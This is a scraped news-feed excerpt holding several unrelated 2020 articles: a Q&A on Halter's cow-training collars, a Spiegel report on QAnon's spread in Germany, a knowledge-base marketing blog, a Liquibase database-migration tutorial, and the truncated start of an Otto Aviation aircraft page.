<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-ca2563ba93dc6cf1ddae"><div><p>Shift, manage and monitor your herd remotely - we‚Äôve summed it up fairly concisely, but how we do that may require a little more paper and a sharpening of the pencil. How are we able to shift a cow to and from the milk shed with the click of a button? Essentially, we train cows to respond to sensory cues which help them understand where they can and cannot go, a method based on the theory of Pavlovian Conditioning. Now, it‚Äôs likely your list of questions is long, so we‚Äôve brought in our Head of Rural, Chris, who oversees all on farm training to give you some answers.</p><p><strong>You say that you use sensory cues to guide cows‚Ä¶ how does that work?</strong></p><p>Like any animal, cows learn behaviours through the use of positive and negative reinforcement. This technique is commonly known as Pavlovian Conditioning, whereby certain stimuli such as sounds, touches and smells are paired with a conditioned response in order to elicit a desired behaviour.</p><p>If you think about the way we farm today, farmers use a multitude of different cues to shift cows or keep them in a particular zone. To put it really simply, Halter replicates these cues and places them on a collar in the form of sound and vibration. </p><p>Vibration can be seen as a positive reinforcer, enabling us to shift cows around the farm as well as indicating to a cow that she is moving in the right direction. You might like to think of vibration as a farmer walking behind their cows to shift them up to the shed! Sound on the other hand helps a cow understand she is moving in the wrong direction or outside of the allocated zone. Currently on the farm an electric fence is the only real means available for farmers to keep their cows within a particular boundary; we instead use sound to replicate a fence line with a pulse used during the initial training period to help a cow understand the meaning of sound. Once the girls are trained we combine sound cues with vibration and we have the ability to guide cows around a farm, keep them out of waterways and set up virtual paddocks and break fences.</p><p><strong>How quick is the training process? Do all cows learn or do some just not get it?&nbsp;</strong></p><p>Cows are extremely quick to respond to sound, within a couple hours of wearing a collar cows learn to stay within a static boundary. It takes a little longer for them to associate vibration with positive cues, however we are currently seeing this happen within a week. In general onboarding takes a week, however this process is continually being modified and improved.</p><p>To date we haven‚Äôt come across any cows that we couldn‚Äôt train! Some learn faster than others but due to the fact that cows are herd animals, the slower ones tend to follow and learn from the faster cows.</p><p><strong>How do you ensure that the training is safe and ethical?</strong></p><p>We‚Äôve been working with animal ethics committees from the start and continue to work closely with them, along with vets and professors in this domain. Welfare is our top priority and our founding vision is to unlock the connection between animals and humans to create a better world, with the hope of not only improving the welfare of cows but other animals in the future. </p><p>We are employing a number of systems to ensure our technology is never harmful to a cow, for instance we have hardcoded mechanisms in place that will shut down a collar should anything out of the ordinary happen, for example a cow getting spooked. We have also considered the training process itself and will begin training softly until a cow becomes more comfortable. </p><p>We want to dramatically improve the welfare of cows and will never compromise their wellbeing.</p><p><strong>Will Halter work on other livestock like sheep and beef cattle? And what about calves?</strong></p><p>Absolutely. Beef cattle would be simple - it just requires a slight change in use case. Sheep would require a collar redesign to fit their small fluffy necks and, no, they are not too stupid! I am confident that the fundamental techniques will work on pretty much any mammal. Pavlovian conditioning is a concept that appeals to very basic animalistic instincts that all mammals, and most likely many other types of animals share.</p><p>In terms of calves there is no reason that Halter wouldn‚Äôt work for them, we‚Äôd just need collars small enough! Although we are currently focused on dairy cattle I see no reason why Halter wouldn‚Äôt work on other livestock in the future!</p><p>Setting up a virtual break fence, shifting cows automatically or drafting a single cow with the touch of a button sounds like a rather crazy concept, but we hope this has given you a touch of background and understanding to it all. We‚Äôll leave you to train your dogs, but trust us when we say - we‚Äôve got the cows covered.</p></div></div></div>]]>
            </description>
            <link>https://halterhq.com/smart-cow-collars</link>
            <guid isPermaLink="false">hacker-news-small-sites-24577468</guid>
            <pubDate>Thu, 24 Sep 2020 11:20:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Most Dangerous Cult of Our Times: QAnon's Inexorable Spread Beyond the U.S.]]>
            </title>
            <description>
<![CDATA[
Score 25 | Comments 19 (<a href="https://news.ycombinator.com/item?id=24577419">thread link</a>) | @nabla9
<br/>
September 24, 2020 | https://www.spiegel.de/international/world/the-most-dangerous-cult-of-our-times-qanon-s-inexorable-spread-beyond-the-u-s-a-e2b13c80-246a-43e5-945b-80ad7767a170 | <a href="https://web.archive.org/web/*/https://www.spiegel.de/international/world/the-most-dangerous-cult-of-our-times-qanon-s-inexorable-spread-beyond-the-u-s-a-e2b13c80-246a-43e5-945b-80ad7767a170">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-article-el="body">
<section data-app-hidden="true">


</section>
<section>
<div>
<p>The path into the parallel world follows rural roads snaking through the hills of Baden-Wurttemberg to a house located on the edge of a village with a bright white fa√ßade, well-swept driveway and carefully trimmed lawn. The conspiracy has long since eaten its way into the southern German idyll. A friendly man opens the door - muscular, burly, he does a lot of lifting.</p>


<div>
<p>It was not easy to set up a meeting. He has a deep aversion to journalists and other members of a supposed elite, whom he believes are covering up a worldwide plot to oppress humanity. Over the phone, he said that he hopes to open the reporter‚Äôs eyes. "Maybe I can wake you up.‚Äù He requested that his real name not be used, so we'll call him Martin Schmidt.</p><p>"The goal of the elites is to stay powerful, to stay rich and to enslave the world,‚Äù he says.</p><p>Schmidt is 27, works as an electrician and has been living with his parents again since the beginning of the pandemic. He leads the way into the living room, with its bright tile floor and woodchip wallpaper, and says he has been thinking about the big questions for a long time. The death of John F. Kennedy, the attacks of September 11, the coronavirus pandemic: He believes they have all been faked as part of a giant plan.</p>
</div>

<p>His father nods next to him. He also believes people are being systematically deceived by politicians and members of the media. Schmidt says: "This elite, they are various men and women who work on Wall Street, to whom the banks belong, all these people.‚Äù He believes businesspeople like George Soros, Bill Gates and Mark Zuckerberg are among them, as well as the Rockefellers and the Rothschilds.</p>

<section data-area="contentbox">
<div>
<figure data-component="Image" data-settings="{&quot;id&quot;:&quot;996d8f55-bef6-471b-ad10-5c788bf27a9e&quot;, &quot;zoomable&quot;:false,&quot;zoomId&quot;:&quot;09eb8bbc-8feb-42e6-b7b6-493d99ae5d8c&quot;}">
<span>
<span data-image-el="aspect">
<span>

<img data-image-el="img" src="https://cdn.prod.www.spiegel.de/images/996d8f55-bef6-471b-ad10-5c788bf27a9e_w568_r0.7571817357121258_fpx50.98_fpy47.69.jpg" srcset="https://cdn.prod.www.spiegel.de/images/996d8f55-bef6-471b-ad10-5c788bf27a9e_w284_r0.7571817357121258_fpx50.98_fpy47.69.jpg 284w, https://cdn.prod.www.spiegel.de/images/996d8f55-bef6-471b-ad10-5c788bf27a9e_w335_r0.7571817357121258_fpx50.98_fpy47.69.jpg 335w, https://cdn.prod.www.spiegel.de/images/996d8f55-bef6-471b-ad10-5c788bf27a9e_w568_r0.7571817357121258_fpx50.98_fpy47.69.jpg 568w" width="568" height="750" sizes="568px" loading="lazy" data-srcset="https://cdn.prod.www.spiegel.de/images/996d8f55-bef6-471b-ad10-5c788bf27a9e_w284_r0.7571817357121258_fpx50.98_fpy47.69.jpg 284w, https://cdn.prod.www.spiegel.de/images/996d8f55-bef6-471b-ad10-5c788bf27a9e_w335_r0.7571817357121258_fpx50.98_fpy47.69.jpg 335w, https://cdn.prod.www.spiegel.de/images/996d8f55-bef6-471b-ad10-5c788bf27a9e_w568_r0.7571817357121258_fpx50.98_fpy47.69.jpg 568w">
</span>
</span>
</span>
</figure>

</div>
</section>
<p>He takes out his smartphone. "I‚Äôll show you how the rich and beautiful party.‚Äù He shows a photo of performance artist Marina Abramoviƒá&nbsp;with the singer Lady Gaga at a charity event. In the picture, they are standing next to a naked female body covered with a red liquid. For Schmidt, the photo is proof of how morally degenerate the leaders of society have become, and that even the so-called elite aren‚Äôt afraid of killing people - even if, in this case, the photo is of an art performance. He says the situation is alarming. "I have awoken.‚Äù</p>

<p>Martin Schmidt is part of a growing number of QAnon sympathizers, one of tens of thousands in Germany. Followers of this right-wing conspiracy theory are convinced that an influential group of Satanist pedophiles is kidnapping boys and girls and using their blood to produce a drug. They believe that the coronavirus was developed in a Chinese lab ‚Äì possibly with the help of Barack Obama ‚Äì in order to hurt Donald Trump and prevent his reelection, a claim that is as absurd as it is false. And they believe Donald Trump is a hero fighting against the "deep state,‚Äù and that he wants to protect the world from the demonic group.</p>

<p>"He is trying to save humanity,‚Äù says Schmidt. "He will take away the elites‚Äô power.‚Äù</p>
<div>
<p>One could dismiss QAnon as crazed paranoia, like the false claims that the moon landing was faked or that the attacks of September 11th were planned by the U.S. government. But what makes the movement unique and, especially, dangerous, is its ideas.</p><p>QAnon‚Äôs followers spread disturbingly familiar themes: a supposed conspiracy of rich elites, including many Jewish businesspeople, targeting the rest of the world; a supposed group of corrupt left-wing politicians infiltrating democracies; journalists who spread propaganda as accomplices to the powerful. These centuries-old fictions from the right-wing, anti-Semitic fringe have been spread into the international public sphere via 21st-century media - part Dreyfus Affair, part Dan Brown.</p><p>"It is no exaggeration to view QAnon as a potential threat to national security,‚Äù says extremism researcher Julia Ebner from the London-based think tank Institute for Strategic Dialogue. Ebner has been researching online radicalization for years and is watching with concern as the German Q movement is becoming more independent and itself trying to recruit new followers.</p><p>Indeed, QAnon is on its way to becoming the most dangerous cult in the world ‚Äì the first ideology to come from the digital realm and to emerge from an online niche into real life, aided by Donald Trump-supporters and right-wing demagogues. The "Q‚Äù cult is fueled by one or several anonymous users who regularly post to the web and who claim to have access to top-secret U.S. government documents ‚Äì a claim that is more than questionable.</p><p>Just as disturbing is how QAnon builds on age-old anti-Semitic conspiracy theories that, centuries ago, claimed Jews drink the blood of Christians and seek to control the world. At the same time, the movement‚Äôs potential for violence is also becoming clearer. In March 2019, a QAnon believer shot an alleged mafia boss in New York because he believed the man was a member of the "deep state.‚Äù In April, U.S. police officers took a woman into custody who had threatened Hillary Clinton on Facebook because she had allegedly abused a child. In 2018, a man in Florida sent mail bombs to prominent Democrats whom he believed to be members of a "deep state" conspiracy.</p><p>The gunman in the central German city of Hanau who killed 10 people and then himself in February alluded to topics circulating in the QAnon cosmos. In a YouTube video, he argued that there were subterranean military installations in the U.S. where children are abused and killed and where the devil is worshipped.</p><p>QAnon followers also played a role in the storming of the Reichstag, the seat of German parliament, in Berlin in late August by a group protesting the authorities‚Äô measures to control COVID-19. Naturopath Tamara Kirschbaum, who called on people to run up the building‚Äôs stairs to the entrance, is identified online as a "freelance employee‚Äù of Qlobal-Change, a portal of QAnon followers. She describes herself as "the voice‚Äù of the "X22 Report,‚Äù a YouTube show about QAnon-related topics that is also translated into German. The Office for the Protection of the Constitution, the German domestic intelligence agency, in the western German state of North Rhine-Westphalia classifies her as a member of the Reichsb√ºrger (or "citizens of the Reich‚Äù) scene, a group that does not believe in the legitimacy of the modern German state.</p><p>Large U.S. tech companies have played a decisive role in the dissemination of the ideology. QAnon would not have been able to spread as fast and far around the world without YouTube, Facebook, Twitter and other social networks. During the coronavirus pandemic and in the first lockdowns in February, the ideology spread even more rapidly, especially in Germany. QAnon has been like a second virus spreading around the world, but this one is very definitely man-made.</p>
</div>

<div>
<p>It is no accident that Trump‚Äôs campaign team has recognized QAnon disciples as an important part of his base and is catering to them. Indeed, several Republican candidates for Congress have professed their affiliation to the movement.</p><p>The QAnon ideology, the first to emerge in the 21st century, is like a blend of video game and online treasure hunt, and emerged on a rather noxious platform that caters largely to young men: 4chan, a simple web forum that was founded in 2003 by a 15-year-old programmer from New York.</p><p><strong>4chan is essentially</strong> a giant digital pinboard with virtually no oversight. Anyone can write and post pretty much anything they want, always anonymously. Only very few things are not allowed and are then deleted. Its offerings include hardcore pornography, as well as tasteless, insulting or right-wing extremist speech. It has given birth to both good and repulsive ideas, which are then commented on and discussed - before immediately being overwhelmed by new posts and ideas.</p><p>4chan‚Äôs roots are in the Japanese manga scene. First-time visitors to the platform will struggle to make sense of its hundreds of discussion groups, manga photos and inside jokes. There are hundreds of thousands of entries every day, supposedly 27 million visitors per month. A unique language has emerged almost without any oversight that, like the jokes, is incomprehensible to outsiders. Thus far, there have been 3.5 billion entries. Users are bound together by the belief that they are part of one of the last bastions of free speech and opinion.</p><p>On October 28, 2017, an anonymous user on 4chan posted the following message: "Hillary Clinton will be arrested between 7:45 AM ‚Äì 8:30 AM EST on Monday ‚Äì the morning of Oct 30, 2017." The author signed later entries with the letter "Q.‚Äù It was the movement's Big Bang, launched by a false prediction. Clinton wasn‚Äôt arrested on October 30th, nor has she been arrested since, but the curiosity of users was piqued.</p><p>Author and conspiracy-theory researcher Timothy Melley at the University of Miami says many Americans are familiar with the elements of the QAnon movement. "It is like a detective novel, where you always inch closer to the truth.‚Äù Q has been posting increasingly complex entries since fall 2017, called "drops‚Äù by followers. These entries contain so-called "breadcrumbs‚Äù that must be followed to reach the goal. Which is ultimately unattainable.</p><p>Q‚Äôs breadcrumbs are like seeds, out of which the stories about the alleged elite conspiracy grow almost by themselves. Q is asking his or her (or their) followers to do their own research if they do not believe the media, turning conspiracy theorists into investigators. Melley argues that the desire to be a part of a revelation keeps them going, even if they never prove anything, and merely keep finding new breadcrumbs.</p>
</div>
<section>
<div data-component="HTMLEmbed">

<p>Illustration: Iris Kuhlmann / DER SPIEGEL; Fotos: Getty Images (3); klaput.blogspot.com; Twitter; wilkowmajority.com; YouTube.</p>
</div>
</section>
<div>
<p>The participatory nature of the ideology is what makes it so attractive. Melley argues that QAnon blends two big conspiracy theories together: a belief that the Illuminati, or someone else, rules the world and that there is a "deep state‚Äù within the government that is ‚Ä¶</p></div></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.spiegel.de/international/world/the-most-dangerous-cult-of-our-times-qanon-s-inexorable-spread-beyond-the-u-s-a-e2b13c80-246a-43e5-945b-80ad7767a170">https://www.spiegel.de/international/world/the-most-dangerous-cult-of-our-times-qanon-s-inexorable-spread-beyond-the-u-s-a-e2b13c80-246a-43e5-945b-80ad7767a170</a></em></p>]]>
            </description>
            <link>https://www.spiegel.de/international/world/the-most-dangerous-cult-of-our-times-qanon-s-inexorable-spread-beyond-the-u-s-a-e2b13c80-246a-43e5-945b-80ad7767a170</link>
            <guid isPermaLink="false">hacker-news-small-sites-24577419</guid>
            <pubDate>Thu, 24 Sep 2020 11:13:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Knowledge Management System ‚Äì KMS Ultimate Guide with Examples]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24577401">thread link</a>) | @robins73
<br/>
September 24, 2020 | https://www.due.work/blog/knowledge-management-system-kms-ultimate-guide-with-examples/ | <a href="https://web.archive.org/web/*/https://www.due.work/blog/knowledge-management-system-kms-ultimate-guide-with-examples/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            


            <section>
                <div>
                    <!--kg-card-begin: image--><figure><img src="https://images.unsplash.com/photo-1504292004442-f285299403fa?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=1080&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ" alt="It is sometimes a good idea to stay at home and work. Not always, but when it happens to have ‚Äòthis day‚Äô, you just can resist. And that‚Äôs totally fine."><figcaption>Photo by <a href="https://unsplash.com/@kundeleknabiegunie?utm_source=ghost&amp;utm_medium=referral&amp;utm_campaign=api-credit">Agnieszka Boeske</a> / <a href="https://unsplash.com/?utm_source=ghost&amp;utm_medium=referral&amp;utm_campaign=api-credit">Unsplash</a></figcaption></figure><!--kg-card-end: image--><p>Today, I will talk about knowledge management systems and its role in an organization. </p><p>First I will make you familiar with some basic concept of knowledge management and then I will jump right into how you can build an effective kms knowledge management system for your business or organization.</p><h2 id="what-is-knowledge-management-and-why-it-is-important">What is knowledge management and why it is important?</h2><p><strong>Knowledge management (KM)</strong> is a process of creating, using and &nbsp;sharing knowledge and information of an organization. </p><p>With a better Knowledge management you can provide a better customer support and answer customers‚Äô questions in real time, as they‚Äôre struggling with their challenges, instead of constantly answering the same questions in your support ticketing system.</p><h3 id="why-use-a-knowledge-management-system">Why use a knowledge management system?</h3><p>In an <strong>Organization</strong>, we often need to share knowledge and informations like documentation, frequently asked questions and other informations for both internal and external customers and to manage all that we need a better knowledge management system.</p><h2 id="what-are-the-two-major-types-of-knowledge-management-systems">What are the two major types of knowledge management systems?</h2><ol><li>Explicit Knowledge </li><li>Tacit Knowledge</li></ol><p>In a KM system, <strong>Explicit knowledge</strong> (also expressive knowledge) is knowledge that can be easily, codified, stored and accessed. It can be easily transmitted to others.</p><p><strong>Tacit knowledge</strong> is the kind of knowledge that is difficult to transfer to another person by means of writing it down or verbalizing it. </p><h3 id="benefits-of-a-kms">Benefits of a KMS</h3><p>Building a knowledge management system or kms system can help you</p><ul><li>Decrease support costs</li><li>Increase customer happiness</li><li>Improve the overall customer experience and customer success ROI</li></ul><!--kg-card-begin: hr--><hr><!--kg-card-end: hr--><h2 id="building-an-effective-knowledge-management-system-in-organization">Building an Effective Knowledge Management System in Organization</h2><!--kg-card-begin: image--><figure><img src="https://images.unsplash.com/photo-1557804506-669a67965ba0?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=1080&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ" alt="This photo is free for public use. ‚ù§Ô∏è If you do use this photo, Please credit in caption or metadata with link to &quot;www.useproof.com&quot;. "><figcaption>Photo by <a href="https://unsplash.com/@austindistel?utm_source=ghost&amp;utm_medium=referral&amp;utm_campaign=api-credit">Austin Distel</a> / <a href="https://unsplash.com/?utm_source=ghost&amp;utm_medium=referral&amp;utm_campaign=api-credit">Unsplash</a></figcaption></figure><!--kg-card-end: image--><p>When we work in an organization, &nbsp;we &nbsp;have to deal with lots of support tickets to manage and a role of knowledge management system tools can be a game changer to help your customer succeed.</p><blockquote><a href="https://www.due.work/knowledge-base">Due.Work</a> is one such example of a knowledge base software and is suitable for both internal and external teams and it has been designed to help you scale your customer support and collaborate better with your team.</blockquote><p><strong>Choosing a knowledge management software</strong><br>There are many KMSs out there of which each should have these characteristics features.</p><ol><li>Knowledge base</li><li>Forums/Customer Feedback/Community</li><li>FAQs</li><li>Case studies</li><li>How-to articles and tutorials</li><li>Resources</li><li>Live Chat<br></li></ol><blockquote>Let's find out some companies that use knowledge management systems. </blockquote><h2 id="knowledge-management-systems-examples-">Knowledge Management Systems Examples. </h2><div><p>I will look for two main examples of knowledge management system to explain how you can organize your knowledge management system.</p><p><strong>Due.work Knowledge Base</strong></p></div><!--kg-card-begin: image--><figure><img src="https://www.due.work/blog/content/images/2020/09/Standalone@2x.png"><figcaption><a href="https://help.due.work/">Source</a></figcaption></figure><!--kg-card-end: image--><p>Here, is a<strong> </strong>centralised<strong> Search Engine</strong> connected with all the support tools like etc which will help user search specific solutions and jump right to it.</p><p>Knowledge Base in Due.work's Help Center is arranged together with several support tools like:</p><ul><li><strong>User guides</strong> - Contains all the basic help like FAQs, How-to articles, Common Issues etc.</li><li><strong>Roadmap - </strong>It contains knowledge related to all the features, future planning of the product that is going to be implement in future versions and users can discuss over it.</li><li><strong>Customer feedback</strong> - Contains feature requests, Bug reports</li><li><strong>Community forums</strong> - Platform where users can share ideas together, discuss and find solutions</li><li><strong>Live chat</strong></li><li><strong>Whats new/News/Announcements</strong></li></ul><h3 id="fullstory-knowledge-base">FullStory Knowledge Base</h3><p>Another knowledge management system example is from FullStory. It also includes articles that address common customer support issues, Training Webinars, Developer Guides and all with a common search.</p><!--kg-card-begin: image--><figure><img src="https://www.due.work/blog/content/images/2020/09/Screenshot-2020-09-24-at-12.30.20-PM-1.png"><figcaption><a href="https://help.fullstory.com/hc/en-us">source</a></figcaption></figure><!--kg-card-end: image--><h3 id="developing-a-knowledge-management-system">Developing a Knowledge Management System</h3><p>Before developing you should first look out for the best knowledge base tools to manage your information. </p><p>Modern knowledge management systems like <a href="https://www.due.work/knowledge-base">Due.work</a> are built for ease of use and is well suitable for global teams. They offer functionality to make it easy to customize the look and feel of your knowledge base, and to improve your content over time. </p><div><p><strong>Choosing a knowledge management software</strong><br>While choosing a perfect km system there are various things we should look our for like What type of support do you offer?</p><p>Let‚Äôs take a closer look at some of the must needed features of a knowledge management system:</p></div><ol><li>Ease of use with Rich text editing and multimedia</li><li>Search Engine Optimization (SEO)</li><li>Reporting and analytics</li><li>Feedback collection</li><li>Multi-language support</li><li>In-build live chat solution</li><li>Customer feedback and Community Support</li><li>Cost</li></ol><blockquote>A knowledge base should act as self-service support apart from having a great content. It should actively help users find answers.</blockquote><h2 id="conclusion">Conclusion</h2><p><strong>Role of knowledge management in organization </strong>is very important with a better tool your team will be able to collaborate more effectively and customers will be more loyal.</p><p>A Knowledge Management System is an essential part of your strategy to drive business growth.</p><p><a href="https://www.due.work/knowledge-base">Due.work</a> is one such tools which provide all those features helps your business to communicate better, and scale your customer support. <strong><a href="https://www.due.work/knowledge-base">Try Due.Work Knowledge Base</a></strong></p><!--kg-card-begin: image--><figure><img src="https://www.due.work/blog/content/images/2020/09/120040267_746241386224500_3974929633963811446_o.png"><figcaption><a href="https://www.due.work/knowledge-base">Due.work - All in one customer support and engagement</a></figcaption></figure><!--kg-card-end: image--><!--kg-card-begin: html--><!--kg-card-end: html-->
                </div>
            </section>



            


        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://www.due.work/blog/knowledge-management-system-kms-ultimate-guide-with-examples/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24577401</guid>
            <pubDate>Thu, 24 Sep 2020 11:10:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Database Version Control with Liquibase]]>
            </title>
            <description>
<![CDATA[
Score 101 | Comments 79 (<a href="https://news.ycombinator.com/item?id=24577239">thread link</a>) | @asafg6
<br/>
September 24, 2020 | https://www.turtle-techies.com/database-version-controler-with-liquibase/ | <a href="https://web.archive.org/web/*/https://www.turtle-techies.com/database-version-controler-with-liquibase/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>
        
        <h4>Introduction to managing DB shcema changes with Liquibase</h4>
                <h6>
                    By Suresh Regmi, Published 2020-09-06
                </h6>
    </p><div itemprop="articleBody"><h2 id="motivation">Motivation</h2>
<p>Let me give you a scenario,<br>
You have a project with multiple database instances in different environments (Dev, QA, Production) and you need to manage the database schema changes that are done against those environments.
Let‚Äôs assume that you are managing those changes by creating a git project or a shared file on a drive and adding a new SQL file for each database changes you are doing.
To implement your changes in that database, for each SQL file, you need to run the changes in each environment manually and add a flag or note to indicate which change is run on which environment.<br>
Would it be able to complete your task?
Yes, Yet, is it a decent method to manage schema changes?<br>
Of Course Not.</p>
<h2 id="here-are-some-of-the-many-problems-you-might-face-while-doing-so">Here are some of the many problems you might face while doing so</h2>
<ol>
<li>Hard to synchronize database and application code changes in different environments</li>
<li>The tedious process to run each change manually in different environments</li>
<li>Collaboration across the development team on what change is deployed and what is not</li>
<li>Hard to roll-back to the previous version of the database</li>
<li>Possibility of data loss</li>
</ol>
<h2 id="here-comes-liquibase">Here comes Liquibase</h2>
<p>Liquibase is an open-source library for tracking and managing database schema changes that can be used for any database with a JDBC driver.<br>
It is a platform-independent database migration tool that allows the database changes referred to as ‚Äòchangesets‚Äô to be written in various formats including XML, JSON, YAML, and SQL.</p>
<h2 id="features">Features</h2>
<ol>
<li>Supports almost all databases that have a JDBC driver.</li>
<li>Changesets can be written in different formats like XML, JSON, YAML, and SQL.</li>
<li>Can be used to automatically generate changesets for an existing database</li>
<li>Easy to integrate with build tools like Jenkins, Maven etc</li>
<li>Supports database rollbacks</li>
<li>Supports context-dependent logic allowing us to use global context and preconditions</li>
<li>Can be executed via command line, Apache Maven, Apache Ant, Spring Framework</li>
<li>Has feature to generate changeset from an existing database and can also generate schema difference as changesets</li>
</ol>
<h2 id="different-ways-to-run-liquibase">Different ways to run liquibase</h2>
<ol>
<li><strong>Embed liquibase with your app:</strong> Embedding liquibase with your application code will automatically deploy liquibase on the app startup.</li>
<li><strong>Run liquibase using build tools:</strong> Integrate liquibase into your build process (with build tools like Jenkins, Ant, Maven, and Gradle) and update them without being tied up with the application.</li>
<li><strong>Generate the SQL and run it manually:</strong> Using update SQL, Liquibase provides the SQL generated from the changeset along with the database changes required to keep the tracking tables up to date. DBA will then inspect the SQL and run them against the database.</li>
</ol>
<h2 id="installation-process">Installation Process</h2>
<p><strong>Prerequisites:</strong> Liquibase requires Java 8+</p>
<p>There are two ways to install Liquibase, Manual installation and using liquibase installer.</p>
<p>If you set up liquibase using the liquibase installer, dependencies, directories, config and properties files will all be in place already.
It also provides some examples which will provide you with the core concepts required to understand the changesets.</p>
<p>In the case of manual installation, you need to download the compressed liquibase file and extract it in your workspace.<br>
For windows users, you need to add a new <code>PATH</code> variable in the <code>Environment Variables</code>.<br>
For macOS users, the path should be added to the <code>bash.profile</code> file.</p>
<p>For detailed instruction on Installation please follow this <a href="https://docs.liquibase.com/concepts/installation/home.html" target="_blank"> document </a>.</p>
<h2 id="core-concepts">Core Concepts</h2>
<ol>
<li><strong>liquibase.properties:</strong> The file <code>liquibase.properties</code> is a text-based file that stores common properties like database connection parameters, driver details, classpath parameters, global changelog parameters etc.
If you install liquibase using liquibase installer, it will provide pre-written <code>liquibase.properties</code> file while in case of manual installation, you need to create <code>liquibase.properties</code> file using a sample file provided.</li>
</ol>
<p><a href="https://www.turtle-techies.com/database-version-controler-with-liquibase/image01.png" target="_blank"><img src="https://www.turtle-techies.com/database-version-controler-with-liquibase/image01.png" alt="Sample liquibase.properties file for Oracle"></a></p>
<ol start="2">
<li><strong>DatabaseChangeLog:</strong> Databasechangelog is a file where all changesets go. Each database changelog can include one or more changesets.</li>
</ol>
<p><a href="https://www.turtle-techies.com/database-version-controler-with-liquibase/image02.png" target="_blank"><img src="https://www.turtle-techies.com/database-version-controler-with-liquibase/image02.png" alt="Example of an empty DatabaseChangeLog file
"></a></p>
<ol start="3">
<li><strong>Changeset:</strong> In liquibase, a changeset is represented as an atomic change to the database. Each changeset should be uniquely identified using author and id fields.
The database handles each changeset as a single transaction.
Changesets can be written in JSON, XML, SQL and YAML formats.</li>
</ol>
<p><a href="https://www.turtle-techies.com/database-version-controler-with-liquibase/image03.png" target="_blank"><img src="https://www.turtle-techies.com/database-version-controler-with-liquibase/image03.png" alt="Example of a changeset in XML format"></a></p>
<ol start="4">
<li><strong>DATABASECHANGELOG &amp; DATABASECHANGELOGLOCK:</strong> These two tables are created by liquibase to track the changes that are run against the database and to make sure that no other migrations age going on.</li>
</ol>
<p><a href="https://www.turtle-techies.com/database-version-controler-with-liquibase/image04.png" target="_blank"><img src="https://www.turtle-techies.com/database-version-controler-with-liquibase/image04.png" alt="DATABASECHANGELOG table structure"></a></p>
<p><a href="https://www.turtle-techies.com/database-version-controler-with-liquibase/image05.png" target="_blank"><img src="https://www.turtle-techies.com/database-version-controler-with-liquibase/image05.png" alt="DATABASECHANGELOGLOCK table structure"></a></p>
<h2 id="what-if-i-dont-like-liquibase">What if I don‚Äôt like Liquibase?</h2>
<p>If you told me that you don‚Äôt like liquibase and are looking for alternatives, I would ask why not Liquibase first.<br>
Liquibase is a sophisticated tool for database migration that has all features that you need for professional database refactoring and versioning.</p>
<p>But still, if you don‚Äôt want to use liquibase, here are some alternatives.</p>
<ol>
<li>
<p><strong>Flyway:</strong> Flyway is an open-source Apache licenced tool for database migration where you can write migrations in database-specific SQL or using Java code. For more details on Flyway, you can refer to this website. <a href="https://flywaydb.org/">https://flywaydb.org/</a></p>
</li>
<li>
<p><strong>YUNIQL:</strong> YUNIQL is also an open-source schema versioning and database migration engine that uses plain SQL scripts which can be integrated with CI/CD pipelines. If you want to check out YUNIQL, you can refer to this website. <a href="https://yuniql.io/">https://yuniql.io/</a></p>
</li>
</ol>
</div></div>]]>
            </description>
            <link>https://www.turtle-techies.com/database-version-controler-with-liquibase/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24577239</guid>
            <pubDate>Thu, 24 Sep 2020 10:43:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Otto Aviation Celera 500L]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24577235">thread link</a>) | @sschueller
<br/>
September 24, 2020 | https://www.ottoaviation.com/celera-500l | <a href="https://web.archive.org/web/*/https://www.ottoaviation.com/celera-500l">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-nc-base="header" data-controller="AncillaryLayout">
      

      

      <div data-controller="HeaderOverlay">

        

        <div>
          

          <main data-collection-id="5f35b58c60ec1a5bfec27cde" data-controller="IndexFirstSectionHeight, Parallax, IndexNavigation">
            
              

    

  

    

      <section id="new-page-4" data-collection-id="5f35bdefb39b853fd30d9222" data-parallax-id="5f35bdefb39b853fd30d9222" data-edit-main-image="Background">
        
        <div>
          <div data-type="page" data-updated-on="1598484123222" id="page-5f35bdefb39b853fd30d9222"><div><div><div data-block-type="23" id="block-yui_3_17_2_1_1597418134173_12402"><p><h2>
  <center><strong><span> It started with an idea of <br>
what air travel could be.</span></strong></center>
</h2></p></div><div data-block-type="2" id="block-yui_3_17_2_1_1597512042385_13210"><p>Imagine the convenience of private air transportation but at a significantly lower cost and a dramatically reduced carbon footprint. The Celera 500L allows this to become a reality and is being called the most significant innovation for private air transportation in decades. <strong>Here‚Äôs why:</strong></p></div><div><div><div data-block-type="5" id="block-yui_3_17_2_1_1597499460996_32083"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
